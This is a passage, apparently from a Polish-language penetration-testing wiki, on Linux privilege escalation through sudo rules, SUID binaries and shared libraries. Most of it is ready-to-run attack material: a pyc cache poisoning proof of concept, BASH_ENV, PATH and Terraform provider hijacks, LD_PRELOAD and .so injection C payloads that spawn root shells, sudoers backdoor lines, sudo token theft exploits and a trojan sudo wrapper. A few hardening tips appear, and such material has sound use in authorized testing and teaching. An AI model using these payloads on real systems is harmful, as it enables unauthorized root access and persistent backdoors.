Jeśli **skrypt Pythona dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie zastąpić zbuforowany plik `.pyc` i uzyskać wykonanie kodu jako uprzywilejowany użytkownik przy następnym imporcie.<sup>[[30]](#references)</sup>

- Dlaczego to działa:
  - CPython przechowuje bufory bytecode w `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter weryfikuje **nagłówek** (magic + metadane znacznika czasu/hash powiązane ze źródłem), a następnie wykonuje zmarshalowany obiekt kodu zapisany za tym nagłówkiem.
  - Jeśli możesz **usunąć i ponownie utworzyć** zbuforowany plik, ponieważ katalog jest zapisywalny, nadal możesz zastąpić plik `.pyc` należący do roota, nawet jeśli nie można go zapisywać.
- Typowa ścieżka:
  - `sudo -l` pokazuje skrypt Pythona lub wrapper, który możesz uruchomić jako root.
  - Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itp.
  - Katalog `__pycache__` zaimportowanego modułu jest zapisywalny przez twojego użytkownika lub przez wszystkich.

Szybka enumeracja:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Jeśli możesz przejrzeć uprzywilejowany skrypt, zidentyfikuj importowane moduły i ścieżkę ich pamięci podręcznej:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Przebieg nadużycia:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego pliku `.pyc` i użyj ich ponownie w zatrutym pliku.
3. Skompiluj obiekt kodu z payloadem, wykonaj `marshal.dumps(...)`, usuń oryginalny plik cache i utwórz go ponownie, łącząc oryginalny nagłówek ze złośliwym bytecode.
4. Ponownie uruchom skrypt dozwolony przez sudo, aby import wykonał payload z uprawnieniami roota.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka jest kluczowe, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode rzeczywiście odpowiada źródłu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do roota i nie można go zapisywać, ale można zapisywać w zawierającym go katalogu `__pycache__`.
- `PYTHONDONTWRITEBYTECODE=1` i `python -B` powstrzymują Pythona przed zapisywaniem nowych plików `.pyc`; **nie** powstrzymują go przed wczytaniem już istniejącego, prawidłowego cache, który został podmieniony przez atakującego. Kluczowe jest to, czy użytkownik o niższych uprawnieniach może podmienić cache akceptowany przez uprzywilejowany import. Python sprawdza metadane dotyczące czasu modyfikacji/rozmiaru lub skrótu przed wczytaniem zbuforowanego bytecode. Zobacz [dokumentację referencyjną importu Pythona](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) oraz [dokumentację wiersza poleceń](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimalny schemat proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Utwardzanie:

- Upewnij się, że żaden katalog w ścieżce importu Pythona z uprawnieniami uprzywilejowanymi nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- Sprawdź właściciela i uprawnienia katalogów cache, w tym istniejących plików `.pyc`. Wyłączenie zapisywania bytecode może ograniczyć tworzenie nowych plików cache, ale nie zabezpiecza istniejącego, podmienialnego pliku cache.
- Traktuj zapisywalne lokalne moduły Pythona i zapisywalne katalogi cache tak samo jak zapisywalne skrypty powłoki lub biblioteki współdzielone uruchamiane przez roota.

### BASH_ENV zachowane przez sudo env_keep → powłoka roota

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Bash dla powłok nieinteraktywnych, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.<sup>[[24]](#references)</sup>

- Dlaczego to działa: W przypadku powłok nieinteraktywnych Bash odczytuje `$BASH_ENV` i wykonuje wskazany plik przed uruchomieniem skryptu docelowego. Wiele reguł sudo zezwala na uruchamianie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowane przez sudo, wskazany plik zostanie wykonany z uprawnieniami roota.<sup>[[23]](#references)</sup>

- Wymagania:
  - Reguła sudo, której możesz użyć (dowolny cel wywołujący nieinteraktywnie `/bin/bash` lub dowolny skrypt bash).
  - `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Zabezpieczenia:
  - Usuń `BASH_ENV` (i `ENV`) z `env_keep`, preferuj `env_reset`.
  - Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
  - Rozważ logowanie I/O sudo i alerty, gdy używane są zachowane zmienne środowiskowe.

### Terraform przez sudo z zachowanym HOME (!env_reset)

Gdy sudo pozwala uruchomić Terraform jako bardziej uprzywilejowany użytkownik, `!env_reset` wskazuje, że warto sprawdzić, które zmienne środowiskowe faktycznie przetrwają tę konkretną regułę. Zanim uznasz zapisywalny przez wywołującego plik `.terraformrc` lub `terraform.rc` za aktywną konfigurację CLI, potwierdź efektywną wartość `HOME` lub `TF_CLI_CONFIG_FILE`. Wpis `provider_installation.dev_overrides` ma znaczenie tylko wtedy, gdy ustalone polecenie Terraform ładuje tego providera, a wywołujący może umieścić jego plik wykonywalny w wybranym katalogu.<sup>[[25]](#references)</sup>

- Wskaż zapisywalny katalog jako lokalizację wymaganego providera i umieść w nim złośliwy plugin o nazwie odpowiadającej providerowi (np. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform nie przejdzie uzgadniania wtyczki Go, ale przed awarią uruchomi payload jako root, pozostawiając po sobie powłokę SUID.

### Nadpisania TF_VAR + obejście walidacji dowiązań symbolicznych

Zmienne Terraform można przekazywać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, jeśli konkretna reguła sudo je zachowuje. Odczyt przez dowiązanie symboliczne źródła wymaga również providera, który podąża za dowiązaniem i kopiuje chroniony plik do lokalizacji, z której wywołujący może go odczytać. Zapis przez dowiązanie symboliczne celu wymaga osobno wpisu docelowego kontrolowanego przez wywołującego oraz uprzywilejowanego providera, który podąża za nim podczas zapisu; późniejsze uruchomienie zaplanowanego zadania to tylko jedna z możliwych konsekwencji. Przed testowaniem któregokolwiek z tych sposobów sprawdź dokładne uprawnienia sudo, odpowiednie pliki `.tf`, wybraną konfigurację CLI oraz właścicieli ścieżek, używając poleceń tylko do odczytu, takich jak `sudo -l`, `stat` i `readlink`. Słabe walidacje leksykalne, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, nie rozwiązują dowiązań symbolicznych:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform rozwiązuje symlink i kopiuje rzeczywisty plik `/root/root.txt` do lokalizacji docelowej, którą może odczytać atakujący. Tę samą metodę można wykorzystać do **zapisu** w uprzywilejowanych lokalizacjach, tworząc wcześniej symlinki w ścieżkach docelowych (np. wskazujące na lokalizację docelową providera wewnątrz `/etc/cron.d/`).

### requiretty / !requiretty

W niektórych starszych dystrybucjach sudo może być skonfigurowane z opcją `requiretty`, która wymusza uruchamianie sudo wyłącznie z interaktywnego TTY. Jeśli ustawiono `!requiretty` (lub opcja ta jest nieobecna), sudo można uruchomić z kontekstów nieinteraktywnych, takich jak reverse shells, zadania cron lub skrypty.

```bash
Defaults !requiretty
```

Nie jest to bezpośrednia podatność sama w sobie, ale rozszerza zakres sytuacji, w których można nadużyć reguł sudo bez konieczności użycia pełnego PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Jeśli `sudo -l` pokazuje `env_keep+=PATH` lub `secure_path` zawierający katalogi zapisywalne przez atakującego (np. `/home/<user>/bin`), niekwalifikowana ścieżka do zewnętrznego polecenia w dozwolonym przez sudo celu może zostać przesłonięta.<sup>[[3]](#references)</sup> Brak efektywnego `secure_path` również warto sprawdzić, **jeśli** środowisko sudo dla polecenia zachowuje `PATH` kontrolowany przez wywołującego; sam brak nie dowodzi, że tak jest. Odczytaj dozwolony skrypt bez uruchamiania go, a następnie zweryfikuj dokładną regułę RunAs i argumentów, efektywną ścieżkę wyszukiwania poleceń oraz wcześniejszy w kolejności katalog, który jest zapisywalny i dostępny do przeszukiwania oraz zawiera nazwę polecenia. Uwierzytelnianie, `NOEXEC`, wbudowane polecenia powłoki i bezwzględne ścieżki do poleceń mogą zmienić rezultat.

- Wymagania: reguła sudo (często `NOPASSWD`) uruchamiająca skrypt/binarny plik, który wywołuje polecenia bez bezwzględnych ścieżek (`free`, `df`, `ps` itd.), oraz zapisywalny wpis `PATH`, który jest przeszukiwany jako pierwszy.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Omijanie ścieżek podczas wykonywania przez sudo
**Przejdź** do innych plików, aby je odczytać, lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Polecenie sudo/plik binarny SUID bez ścieżki do polecenia

Jeśli uprawnienie **sudo** jest przyznane do pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_, można to wykorzystać, zmieniając zmienną PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Tej techniki można również użyć, jeśli plik binarny **suid** **wykonuje inne polecenie bez podania do niego ścieżki (zawsze sprawdzaj zawartość dziwnego pliku binarnego SUID za pomocą** _**strings**_**)**.

[Przykłady payloadów do wykonania.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Plik binarny SUID ze ścieżką do polecenia

Jeśli plik binarny **suid** **wykonuje inne polecenie, podając do niego ścieżkę**, możesz spróbować **wyeksportować funkcję** o nazwie takiej jak polecenie wywoływane przez plik SUID.

Na przykład jeśli plik binarny SUID wywołuje _**/usr/sbin/service apache2 start**_, spróbuj utworzyć i wyeksportować funkcję:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Następnie, gdy wywołasz binarny plik SUID, ta funkcja zostanie wykonana

### Niestandardowe wrappery SUID do kopiowania

Narzędzie SUID należące do roota, które przyjmuje ścieżki źródłową i docelową, może przekraczać dwie różne granice zaufania. Jeśli tworzy polecenie powłoki z któregokolwiek argumentu (na przykład przekazuje skonstruowane polecenie `cp` do `system()`), metaznaki powłoki mogą uruchomić inne polecenie z uprawnieniami efektywnymi tego narzędzia. Nawet jeśli wywołuje `cp` bezpiecznie, bez powłoki, nieograniczona ścieżka docelowa może umożliwić dowolny uprzywilejowany zapis do plików takich jak `/etc/passwd`. Sprawdź obsługę argumentów przez wrapper, zachowanie efektywnego UID, ograniczenia dotyczące lokalizacji docelowej oraz to, czy kopiowany plik zachowuje zawartość kontrolowaną przez wywołującego; ogólny błąd `cp` ani sam bit SUID nie stanowią dowodu żadnej z tych ścieżek. Przed jakimikolwiek ręcznymi testami pasywnie zinwentaryzuj plik binarny i jego uprawnienia.

### Skrypt zapisywalny przez użytkownika, wykonywany przez wrapper SUID

Częstym błędem konfiguracji niestandardowej aplikacji jest wrapper SUID należący do roota, który uruchamia skrypt zapisywalny przez użytkowników o niskich uprawnieniach.

Typowy wzorzec:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Jeśli `/usr/local/bin/backup.sh` jest zapisywalny, możesz dopisać polecenia payloadu, a następnie uruchomić wrapper SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Szybkie kontrole:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Ta ścieżka ataku jest szczególnie częsta w wrapperach do „konserwacji”/„kopii zapasowych” dostarczanych w `/usr/local/bin`.

### LD_PRELOAD i **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określenia jednej lub kilku bibliotek współdzielonych (plików .so), które loader załaduje przed wszystkimi pozostałymi, w tym standardową biblioteką C (`libc.so`). Ten proces nazywa się preloadingiem biblioteki.

Aby jednak zachować bezpieczeństwo systemu i zapobiec wykorzystywaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system wymusza określone warunki:

- Loader ignoruje **LD_PRELOAD** w przypadku plików wykonywalnych, dla których rzeczywisty identyfikator użytkownika (_ruid_) różni się od efektywnego identyfikatora użytkownika (_euid_).
- W przypadku plików wykonywalnych z suid/sgid preloadowane są tylko biblioteki ze standardowych ścieżek, które również mają ustawione suid/sgid.

Eskalacja uprawnień może nastąpić, jeśli możesz wykonywać polecenia za pomocą `sudo`, a wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala zachować zmienną środowiskową **LD_PRELOAD** i sprawia, że jest ona uwzględniana również podczas uruchamiania poleceń za pomocą `sudo`, co może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Zapisz jako **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Następnie **skompiluj to** za pomocą:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Na koniec **eskaluj uprawnienia**, uruchamiając-vesm

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Plik binarny SUID – .so injection

W przypadku napotkania pliku binarnego z uprawnieniami **SUID**, który wydaje się nietypowy, warto sprawdzić, czy prawidłowo ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Na przykład napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ wskazuje na możliwość wykorzystania tej podatności.

Aby to wykorzystać, należy utworzyć plik C, na przykład _"/path/to/.config/libcalc.c"_, zawierający następujący kod:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Ten kod po skompilowaniu i uruchomieniu ma na celu podniesienie uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie powłoki z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do biblioteki współdzielonej (.so) za pomocą:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Na koniec uruchomienie podatnego pliku binarnego SUID powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Teraz, gdy znaleźliśmy plik binarny SUID ładujący bibliotekę z folderu, do którego możemy zapisywać, utwórzmy w tym folderze bibliotekę o wymaganej nazwie:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Jeśli pojawi się błąd taki jak

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

to oznacza, że wygenerowana przez Ciebie biblioteka musi zawierać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to starannie opracowana lista plików binarnych Unix, które atakujący może wykorzystać do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to podobna lista, ale dotycząca przypadków, w których możesz **wstrzykiwać tylko argumenty** do polecenia.

Projekt gromadzi legalne funkcje plików binarnych Unix, które można wykorzystać do ucieczki z ograniczonych powłok, eskalacji lub utrzymania podwyższonych uprawnień, przesyłania plików, uruchamiania powłok bind i reverse oraz ułatwiania innych zadań po eksploatacji.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie którejś reguły sudo.

### Ponowne użycie tokenów Sudo

Jeśli masz **dostęp do sudo**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.<sup>[[18]](#references)</sup>

Wymagania dotyczące eskalacji uprawnień:

- Masz już powłokę jako użytkownik "_sampleuser_"
- Użytkownik "_sampleuser_" **użył `sudo`** do wykonania czegoś w ciągu **ostatnich 15 minut** (domyślny czas ważności tokenu sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępne (możesz je przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe, modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Pierwszy exploit** (`exploit.sh`) utworzy w _/tmp_ plik binarny `activate_sudo_token`. Możesz go użyć do **aktywowania tokenu sudo w swojej sesji** (nie otrzymasz automatycznie powłoki root — wykonaj `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Drugi exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **należącą do roota i z ustawionym setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Trzeci exploit** (`exploit_v3.sh`) **utworzy plik sudoers**, który sprawi, że **tokeny sudo będą wieczne i wszyscy użytkownicy będą mogli używać sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub w którymkolwiek z utworzonych w nim plików, możesz użyć binarnego pliku [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz powłokę działającą jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez znajomości hasła, wykonując:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` i pliki znajdujące się w `/etc/sudoers.d` określają, kto może używać `sudo` i w jaki sposób. Domyślnie **pliki te mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz **uzyskać interesujące informacje**, a jeśli możesz **zapisywać** w dowolnym pliku, będziesz w stanie **eskalować uprawnienia**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Jeśli masz uprawnienia do zapisu, możesz je nadużyć.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Inny sposób na nadużycie tych uprawnień:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Istnieją alternatywy dla pliku binarnego `sudo`, takie jak `doas` dla OpenBSD. Pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Jeśli `doas` zezwala na użycie edytora lub interpretera, sprawdź techniki escape w stylu GTFOBins:

```bash
doas vim
:!/bin/sh
```

Reguła `doas` umożliwiająca działanie jako root dla oryginalnego `dstat` opartego na Pythonie również uzasadnia sprawdzenie ścieżek wtyczek. W [podręczniku](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) i [kodzie źródłowym](https://github.com/dstat-real/dstat/blob/master/dstat) wymieniono `/usr/share/dstat/` i `/usr/local/share/dstat/` jako lokalizacje wtyczek `dstat_*.py`. Jeśli bieżący użytkownik może zapisywać do lokalizacji faktycznie używanej przez zainstalowaną kompilację i przeszukiwać ją, wybrana wtyczka może zostać uruchomiona z tożsamością RunAs określoną przez `doas`. Sprawdź efektywną regułę, sposób wyszukiwania wtyczek w tej kompilacji, uprawnienia lub ACL katalogu i katalogów nadrzędnych oraz to, czy wywołujący może wybrać wtyczkę; sama reguła `dstat` lub zapisywalny katalog to jedynie wskazówka. Inne implementacje `dstat` mogą korzystać z odmiennych systemów wtyczek. Pasywnie sprawdzaj metadane, nie ładując wtyczki.

### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień, a ty uzyskałeś powłokę w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny `sudo`**, który uruchomi twój kod jako root, a następnie polecenie użytkownika. Potem **zmień `$PATH`** w kontekście użytkownika (na przykład dodając nową ścieżkę w `.bash_profile`), aby po uruchomieniu przez niego `sudo` wykonywał się twój plik.

Pamiętaj, że jeśli użytkownik korzysta z innej powłoki (nie z basha), trzeba będzie zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc` i `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś w rodzaju:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że wczytane zostaną pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf`. Te pliki konfiguracyjne **wskazują inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość pliku `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie wyszukiwał biblioteki w folderze `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w dowolnej ze wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub dowolnym folderze wskazanym w pliku konfiguracyjnym wewnątrz `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz, **jak wykorzystać tę błędną konfigurację** na stronie:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Po skopiowaniu biblioteki do `/var/tmp/flag15/` program użyje jej z tej lokalizacji, zgodnie ze zmienną `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Możliwości

Linux capabilities zapewniają **procesowi podzbiór dostępnych uprawnień roota**. W praktyce dzieli to **uprawnienia roota na mniejsze, odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przyznawać procesom. W ten sposób ogranicza się pełny zestaw uprawnień, zmniejszając ryzyko wykorzystania podatności.\
Przeczytaj poniższą stronę, aby **dowiedzieć się więcej o capabilities i sposobach ich nadużywania**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Uprawnienia katalogów

W katalogu **bit „execute”** oznacza, że dany użytkownik może przejść do folderu za pomocą polecenia „**cd**”.\
Bit **„read”** oznacza, że użytkownik może wyświetlać **pliki**, a bit **„write”** oznacza, że może usuwać i tworzyć nowe **pliki**.

## ACLs

Listy kontroli dostępu (ACLs) stanowią dodatkową warstwę uprawnień uznaniowych, która może **nadpisywać tradycyjne uprawnienia ugo/rwx**. Te uprawnienia zapewniają większą kontrolę nad dostępem do plików i katalogów, umożliwiając przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Taki poziom **szczegółowości pozwala precyzyjniej zarządzać dostępem**. Więcej informacji znajdziesz [**tutaj**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Nadaj** użytkownikowi „kali” uprawnienia do odczytu i zapisu pliku:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Pobierz** pliki z określonymi ACL-ami z systemu:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Ukryty backdoor ACL w plikach drop-in sudoers

